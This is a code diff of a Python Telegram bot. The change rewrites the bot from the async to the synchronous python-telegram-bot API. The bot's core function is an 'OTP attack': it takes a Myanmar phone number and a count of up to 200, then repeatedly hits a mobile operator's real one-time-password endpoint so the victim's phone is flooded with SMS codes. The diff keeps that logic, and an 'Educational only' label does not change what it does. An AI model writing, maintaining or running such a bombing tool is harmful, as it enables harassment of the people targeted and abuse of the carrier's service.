@@ -3,8 +3,8 @@ import requests
 import logging
 from flask import Flask
 from threading import Thread
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, ConversationHandler, MessageHandler, Filters
 
 # ---------- CONFIG ----------
 TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
@@ -14,15 +14,15 @@ if not TOKEN:
 # Conversation states
 PHONE, COUNT = range(2)
 
-# ---------- OTP Attack Logic (same as original) ----------
-async def send_otp_attack(phone: str, count: int, update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ---------- OTP Attack Logic (synchronous) ----------
+def send_otp_attack(bot, update, phone, count):
     if not (phone.startswith("09") and len(phone) == 11):
-        await update.message.reply_text("❌ Invalid number. Must be 11 digits starting with 09 (without +95).")
-        return False
+        update.message.reply_text("❌ Invalid number. Must be 11 digits starting with 09 (without +95).")
+        return
 
     url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}"
     success = 0
-    status_msg = await update.message.reply_text(f"🚀 Attacking {phone}\nAttempts: 0/{count}")
+    status_msg = update.message.reply_text(f"🚀 Attacking {phone}\nAttempts: 0/{count}")
 
     for i in range(1, count + 1):
         try:
@@ -32,47 +32,55 @@ async def send_otp_attack(phone: str, count: int, update: Update, context: Conte
         except:
             pass
         if i % 5 == 0 or i == count:
-            await status_msg.edit_text(f"🚀 Attacking {phone}\nAttempts: {i}/{count}\nSuccessful: {success}")
+            bot.edit_message_text(
+                chat_id=update.message.chat_id,
+                message_id=status_msg.message_id,
+                text=f"🚀 Attacking {phone}\nAttempts: {i}/{count}\nSuccessful: {success}"
+            )
 
-    await status_msg.edit_text(f"✅ Finished.\nTarget: {phone}\nTotal: {count}\nSuccess: {success}\n⚠️ Educational only.")
+    bot.edit_message_text(
+        chat_id=update.message.chat_id,
+        message_id=status_msg.message_id,
+        text=f"✅ Finished.\nTarget: {phone}\nTotal: {count}\nSuccess: {success}\n⚠️ Educational only."
+    )
 
-# ---------- Telegram Handlers ----------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
+# ---------- Conversation Handlers ----------
+def start(update, context):
+    update.message.reply_text(
         "👋 OTP Tester Bot\n/attack - Start OTP sequence\n"
         "👨‍💻 @Ace_TM0 | Myanmar Cyber Security"
     )
 
-async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("📞 Send phone number (11 digits, starts with 09):")
+def attack_start(update, context):
+    update.message.reply_text("📞 Send phone number (11 digits, starts with 09):")
     return PHONE
 
-async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def get_phone(update, context):
     phone = update.message.text.strip()
     if not (phone.startswith("09") and len(phone) == 11 and phone.isdigit()):
-        await update.message.reply_text("❌ Invalid. Try again or /cancel")
+        update.message.reply_text("❌ Invalid. Try again or /cancel")
         return PHONE
     context.user_data["phone"] = phone
-    await update.message.reply_text("🔢 How many OTP requests? (1-200):")
+    update.message.reply_text("🔢 How many OTP requests? (1-200):")
     return COUNT
 
-async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def get_count(update, context):
     try:
         count = int(update.message.text)
         if count < 1 or count > 200:
-            await update.message.reply_text("Number between 1 and 200.")
+            update.message.reply_text("Number between 1 and 200.")
             return COUNT
     except ValueError:
-        await update.message.reply_text("Enter a number.")
+        update.message.reply_text("Enter a number.")
         return COUNT
 
     phone = context.user_data["phone"]
-    await update.message.reply_text(f"⏳ Starting {count} attempts on {phone}...")
-    await send_otp_attack(phone, count, update, context)
+    update.message.reply_text(f"⏳ Starting {count} attempts on {phone}...")
+    send_otp_attack(update.message.bot, update, phone, count)
     return ConversationHandler.END
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Cancelled.")
+def cancel(update, context):
+    update.message.reply_text("Cancelled.")
     return ConversationHandler.END
 
 # ---------- Keep-Alive Web Server (for Render) ----------
@@ -88,25 +96,29 @@ def run_http_server():
 
 # ---------- Main ----------
 def main():
-    # Start HTTP server in background (so Render sees open port)
+    # Start HTTP server in background
     Thread(target=run_http_server, daemon=True).start()
 
-    # Start Telegram bot with polling
-    application = Application.builder().token(TOKEN).build()
+    # Set up Telegram bot (synchronous Updater)
+    updater = Updater(token=TOKEN, use_context=True)
+    dp = updater.dispatcher
+
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("attack", attack_start)],
         states={
-            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
-            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
+            PHONE: [MessageHandler(Filters.text & ~Filters.command, get_phone)],
+            COUNT: [MessageHandler(Filters.text & ~Filters.command, get_count)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(conv_handler)
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(conv_handler)
 
+    # Start polling
+    updater.start_polling()
     print("Bot started...")
-    application.run_polling()
+    updater.idle()
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO)
-    main()               
+    main()
